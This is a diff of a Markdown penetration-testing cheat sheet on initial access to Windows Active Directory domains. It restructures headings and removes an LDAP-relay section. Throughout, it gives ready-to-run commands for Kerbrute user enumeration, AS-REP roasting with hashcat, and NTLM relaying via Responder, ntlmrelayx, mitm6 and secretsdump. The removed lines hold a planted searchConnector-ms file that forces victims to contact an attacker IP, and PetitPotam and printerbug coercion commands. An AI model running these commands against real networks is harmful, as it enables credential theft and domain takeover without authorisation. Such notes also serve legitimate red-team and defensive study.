@@ -1,13 +1,19 @@
 # Initial Access attacks
 * [Web Attacks](#Web-Attacks) 
-* [Password Attacks](#Password Attacks)
-
+* [Password Attacks](#Password-Attacks)
+  * [Enumerate users](#Enumerate-users)
+  * [AS-REP Roasting](#AS-REP-Roasting)
+* [Relaying Attacks](#Relaying-Attacks)
+    * [SMB relaying](#SMB-relaying)
+    * [LDAP Relaying](#LDAP-Relaying)
+    * [LDAPS Relaying](#LDAPS Relaying)
+      * [Resource Based Constrained Delegation Webclient Attack](#Resource Based Constrained Delegation Webclient Attack)
 
 ## Web Attacks
 - It is possible to get access by abusing a lot of web attacks which might give you access to the system. There are to many to subscribe here, but I might make a list someday.
 
 ## Password Attacks
-### Kerbrute Enum users
+### Enumerate users
 - https://github.com/ropnop/kerbrute
 ```
 sudo ./kerbrute userenum -d <domain> domain_users.txt
@@ -31,6 +37,7 @@ hashcat -a 0 -m 18200 hash.txt rockyou.txt
 
 ## Relaying attacks
 - https://www.trustedsec.com/blog/a-comprehensive-guide-on-relaying-anno-2022/
+
 #### Check if LLMNR and NBT-NS is used
 - Link Local Multicast Name Resolution (LLMNR) and NetBIOS Name Resolution (NBT-NS).
 - Use ```-A``` for analyze mode.
@@ -78,54 +85,8 @@ proxychains python3 secretsdump.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGE
 proxychains python3 smbclient.py <DOMAIN>/<USER>:IDontCareAboutPassword@<TARGET>
 ```
 
-## LDAP Relaying
-### Relay requests LDAP
-- Requires HTTP requests, because SMB signing is enabled by default.
-
-#### Scan for target with webclient active
-- https://github.com/Hackndo/WebclientServiceScanner
-```
-webclientservicescanner <DOMAIN>/<USER>:<PASSWORD>@<IP RANGE> -dc-ip <DC IP>
-```
-
-#### If no targets, place file on share to activate webclients
-- https://www.bussink.net/webclient_activation/
-- Filename ```Documents.searchConnector-ms```
-```
-<?xml version="1.0" encoding="UTF-8"?>
-<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
-    <iconReference>imageres.dll,-1002</iconReference>
-    <description>Microsoft Outlook</description>
-    <isSearchOnlyItem>false</isSearchOnlyItem>
-    <includeInStartMenuScope>true</includeInStartMenuScope>
-    <iconReference>https://<ATTACKER IP>/0001.ico</iconReference>
-    <templateInfo>
-        <folderType>{91475FE5-586B-4EBA-8D75-D17434B8CDF6}</folderType>
-    </templateInfo>
-    <simpleLocation>
-        <url>https://www.bussink.net/</url>
-    </simpleLocation>
-</searchConnectorDescription>
-```
-
-#### Enable the LDAP relay
-```
-Responder -I eth0
-ntlmrelayx.py -t ldap://<DC IP> -smb2support
-```
-
-#### Trigger target to authenticate to attacker machine
-- https://github.com/topotam/PetitPotam
-- https://github.com/dirkjanm/krbrelayx
-```
-python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@80/a <TARGET>
-
-python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
-```
-
-- However, since printerbug and PetitPotam both needed authentication to work, we could have just used a tool like ldapdomaindump to directly bind to LDAP ourselves and dump the data directly. To do this unauthenticated use mitm6!
-
-## Mitm6
+### LDAP Relaying
+- With mitm6
 - In modern Windows operating systems, IPv6 is enabled by default. This means that systems periodically poll for an IPv6 lease, as IPv6 is a newer protocol than IPv4, and Microsoft decided it was a good idea to give IPv6 precedence over IPv4.
 - However, in the vast majority of organizations, IPv6 is left unused, which means that an adversary could hijack the DHCP requests for IPv6 addresses and force authentication attempts to the attacker-controlled system. We do that by setting our system as the primary DNS server.
 - Spoof any requests for internal resources
@@ -135,7 +96,7 @@ sudo mitm6 -d <DOMAIN> --ignore-nofqdn
 ntlmrelayx.py -t ldap://<DC IP> -wh <DOMAIN> -6
 ```
 
-## LDAPS Relaying
+### LDAPS Relaying
 - Relaying LDAPS can add a new computer account by abusing the fact that, by default, user are allowed to join domain up to 10 new computer objects
 
 #### Enable the LDAPS relay
@@ -146,18 +107,9 @@ sudo mitm6 -d <DOMAIN> --ignore-nofqdn
 ntlmrelayx.py -t ldaps://<DC IP> --add-computer <COMPUTER NAME>
 ```
 
-#### Trigger target to authenticate to attacker machine
-- https://github.com/topotam/PetitPotam
-- https://github.com/dirkjanm/krbrelayx
-```
-python3 PetitPotam.py -d <DOMAIN> -u <USER> -p <PASSWORD> <HOSTNAME ATTACKER MACHINE>@80/a <TARGET>
-
-python3 printerbug.py <DOMAIN>/<USER>@<TARGET> <HOSTNAME ATTACKER MACHINE>@80/a
-```
-
 - When computer account is created. This account can be used to enumerate the domain!
 
-#### Resource Based Constrained Delegation Webclient Attack
+### Resource Based Constrained Delegation Webclient Attack
 - Requirements:
   - On a Domain Controller to have the LDAP server signing not enforced (default value) (Requires authentication to check)
   - On a Domain Controller to have the LDAPS channel binding not required (default value)
